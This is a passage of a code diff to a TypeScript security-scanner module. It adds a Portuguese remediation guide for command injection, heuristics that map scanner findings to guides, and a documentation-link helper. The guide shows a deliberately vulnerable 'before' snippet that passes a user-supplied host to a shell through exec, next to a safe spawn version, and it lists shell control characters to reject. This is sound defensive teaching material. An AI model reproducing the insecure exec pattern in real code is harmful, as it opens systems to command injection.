+        description: 'Permita apenas caracteres alfanuméricos estritos e rejeite qualquer caractere especial de controle (; & | ` $).',
+        commandOrSnippet: `if (!/^[a-zA-Z0-9_-]+$/.test(inputParam)) throw new Error('Entrada inválida');`,
+        commandType: 'typescript',
+        keyTakeaway: 'Validação rígida baseada em allowlist é a primeira linha de defesa.'
+      }
+    ],
+    beforeAfterCode: {
+      language: 'typescript',
+      before: `// ❌ INSEGURO: Concatenação direta com shell ativo\nimport { exec } from 'child_process';\nexec(\`ping -c 1 \${userSuppliedHost}\`);`,
+      after: `// ✅ SEGURO: spawn com argumentos em array separados\nimport { spawn } from 'child_process';\nspawn('ping', ['-c', '1', userSuppliedHost]);`,
+      explanation: 'O método spawn com array não instancia um interpretador shell, impedindo command chaining.'
+    },
+    gitHistoryPurge: {
+      command: '# Não requer expurgo de histórico git se não envolver senhas.',
+      warning: 'Revise todas as chamadas a utilitários de sistema operacional.'
+    },
+    secretRotationGuide: 'Não se aplica a injeção de comandos; audite os logs de execução do servidor.',
+    preventativeMeasures: [
+      'Evite chamadas ao sistema operacional: prefira bibliotecas nativas de Node.js.',
+      'Execute a aplicação em containers com usuário não-root (USER node) e sistema de arquivos somente-leitura.'
+    ],
+    tags: ['rce', 'command-injection', 'child_process', 'exec', 'spawn', 'sast']
   }
 ];
 
@@ -781,7 +1326,21 @@ export function getRemediationGuideForFinding(finding: ScanFinding): Remediation
   );
   if (byRuleId) return byRuleId;
 
-  // 2. Pattern heuristics by ruleName and content
+  // 2. Pattern heuristics for SAST Taint Sinks
+  if (category === 'TAINT_SINK' || ruleId.includes('sink') || ruleName.includes('sink') || ruleName.includes('injection') || ruleName.includes('xss')) {
+    if (ruleName.includes('xss') || ruleId.includes('xss') || ruleName.includes('innerhtml')) {
+      const xssGuide = REMEDIATION_WIKI_GUIDES.find(g => g.id === 'sink-xss-dom');
+      if (xssGuide) return xssGuide;
+    }
+    if (ruleName.includes('command') || ruleId.includes('exec') || ruleName.includes('spawn') || ruleName.includes('rce')) {
+      const cmdGuide = REMEDIATION_WIKI_GUIDES.find(g => g.id === 'sink-command-injection');
+      if (cmdGuide) return cmdGuide;
+    }
+    const fallbackSink = REMEDIATION_WIKI_GUIDES.find(g => g.id === 'sink-xss-dom');
+    if (fallbackSink) return fallbackSink;
+  }
+
+  // 3. Pattern heuristics by ruleName and content
   if (ruleName.includes('aws') || ruleId.includes('aws') || matched.startsWith('akia')) {
     return REMEDIATION_WIKI_GUIDES.find(g => g.id === 'cloud-credentials-aws')!;
   }
@@ -822,7 +1381,7 @@ export function getRemediationGuideForFinding(finding: ScanFinding): Remediation
     return REMEDIATION_WIKI_GUIDES.find(g => g.id === 'api-path-sensitive')!;
   }
 
-  // 3. Category Fallback
+  // 4. Category Fallback
   if (category === 'CLOUD_CREDENTIAL') {
     return REMEDIATION_WIKI_GUIDES.find(g => g.id === 'cloud-credentials-aws')!;
   }
@@ -845,3 +1404,19 @@ export function getRemediationGuideForFinding(finding: ScanFinding): Remediation
   // Fallback to high entropy
   return REMEDIATION_WIKI_GUIDES.find(g => g.id === 'high-entropy-secrets') || REMEDIATION_WIKI_GUIDES[0];
 }
+
+/**
+ * Returns the official security documentation links for a finding
+ * (Prioritizes finding.documentationLinks, falling back to remediation guide links)
+ */
+export function getOfficialDocLinksForFinding(finding: ScanFinding): OfficialDocLink[] {
+  if (finding.documentationLinks && finding.documentationLinks.length > 0) {
+    return finding.documentationLinks;
+  }
+  const guide = getRemediationGuideForFinding(finding);
+  if (guide && guide.officialReferences && guide.officialReferences.length > 0) {
+    return guide.officialReferences;
+  }
+  return [];
+}
+
